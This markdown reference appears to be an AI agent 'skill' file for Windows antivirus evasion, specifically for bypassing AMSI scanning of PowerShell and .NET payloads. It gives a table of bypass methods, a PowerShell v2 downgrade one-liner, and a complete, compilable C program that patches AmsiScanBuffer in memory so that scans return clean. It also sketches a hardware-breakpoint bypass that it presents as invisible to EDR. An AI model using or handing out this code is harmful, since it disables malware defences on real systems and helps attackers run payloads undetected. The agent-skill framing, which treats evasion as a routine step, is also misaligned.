# AMSI Bypass — Complete Reference

> **Belongs to**: `windows-av-evasion` skill
> **Load when**: PowerShell/.NET/VBScript payload blocked by AMSI

## Quick Bypass Categories

| Category | Method | Detection Risk | Persistence |
|---|---|---|---|
| Memory patching | Patch `AmsiScanBuffer` in `amsi.dll` | Medium | Per-process |
| Reflection | Modify AMSI init flags via .NET reflection | Medium | Per-session |
| String obfuscation | Encode/split AMSI trigger strings | Low | Per-payload |
| PowerShell downgrade | Force PS v2 (no AMSI) | Low | Per-session |
| CLM bypass | Escape Constrained Language Mode | Medium | Per-session |
| COM hijack | Redirect AMSI COM server | Low | Per-user |

## Quick One-Liners

```powershell
# PowerShell v2 downgrade (if .NET 2.0 available — no AMSI in v2)
powershell -Version 2

# Reflection-based (set amsiInitFailed = true)
# Obfuscated to avoid static detection — see AMSI_BYPASS_TECHNIQUES.md for full patterns
```

## C Language AMSI Patch (Complete Implementation)

```c
/**
 * Patch AmsiScanBuffer to return E_INVALIDARG
 * Compile: x86_64-w64-mingw32-gcc -O2 patch_amsi.c -o patch_amsi.exe
 *
 * Principle: Patch the first few bytes of amsi.dll!AmsiScanBuffer
 * to return 0x80070057 (E_INVALIDARG), causing AMSI callers to skip scanning.
 */

#include <windows.h>
#include <stdio.h>

BOOL PatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] LoadLibrary(amsi.dll) failed\n");
        return FALSE;
    }

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] GetProcAddress(AmsiScanBuffer) failed\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer @ 0x%p\n", pAmsiScanBuffer);

    DWORD oldProtect = 0;
    SIZE_T patchSize = 6; // x64: 6 bytes

#ifdef _WIN64
    // x64: mov eax, 0x80070057; ret
    //     B8 57 00 07 80    mov eax, 0x80070057
    //     C3                ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
    // x86: mov eax, 0x80070057; ret 0x18
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    patchSize = 8;
#endif

    if (!VirtualProtect(pAmsiScanBuffer, patchSize,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        return FALSE;
    }

    memcpy(pAmsiScanBuffer, patch, patchSize);

    DWORD dummy;
    VirtualProtect(pAmsiScanBuffer, patchSize, oldProtect, &dummy);

    printf("[+] AmsiScanBuffer patched successfully\n");
    return TRUE;
}

// After calling this, all PowerShell AMSI scans return AMSI_RESULT_CLEAN
```

## Patchless AMSI Bypass (Hardware Breakpoint — Maximum Stealth)

2025-2026's highest-level user-mode bypass. Zero memory modification.

```c
/**
 * Hardware breakpoint (DR0) + VEH for traceless AMSI bypass
 * - Set HW breakpoint at AmsiScanBuffer entry
 * - VEH handler catches breakpoint and modifies RAX = E_INVALIDARG
 * - Skip function body, return directly
 * - No memory bytes modified, no VirtualProtect called
 * - EDR memory integrity checks cannot detect
 */
// See advanced-process-injection skill's Sleep Obfuscation chapter
// or KazuLoader v3 (Turla APT) hardware breakpoint technique
```

**For C# / PowerShell patterns** → see `AMSI_BYPASS_TECHNIQUES.md`
